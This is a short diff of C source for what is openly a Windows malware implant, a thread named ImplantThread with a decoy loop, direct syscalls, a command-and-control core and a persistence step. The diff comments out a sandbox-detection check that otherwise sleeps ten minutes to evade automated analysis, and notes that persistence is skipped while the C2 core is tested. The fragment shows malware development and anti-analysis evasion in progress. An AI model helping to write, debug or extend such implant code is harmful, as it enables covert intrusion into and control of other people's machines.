@@ -40,16 +40,19 @@ DWORD WINAPI ImplantThread(LPVOID) {
     printf("[DEBUG] DecoyLoop done\n");
     fflush(stdout);
 
-    printf("[DEBUG] Running SandboxCheck...\n");
+    // ──────────────────────────────────────────────────────────────
+    //  DISABLE SANDBOX CHECK FOR TESTING
+    // ──────────────────────────────────────────────────────────────
+    printf("[DEBUG] SandboxCheck disabled for testing.\n");
     fflush(stdout);
+    /*
     if (SandboxCheck()) {
         printf("[DEBUG] SandboxCheck returned TRUE – sleeping 10 minutes\n");
         fflush(stdout);
         NtSleep(600000);
         return 0;
     }
-    printf("[DEBUG] SandboxCheck passed\n");
-    fflush(stdout);
+    */
 
     printf("[DEBUG] Initializing syscalls...\n");
     fflush(stdout);
@@ -86,7 +89,7 @@ DWORD WINAPI ImplantThread(LPVOID) {
     }
 
     // ──────────────────────────────────────────────────────────────
-    //  SKIP PERSISTENCE – we test the C2 core first
+    //  SKIP PERSISTENCE – test C2 core
     // ──────────────────────────────────────────────────────────────
     printf("[DEBUG] Skipping persistence installation for testing.\n");
     fflush(stdout);
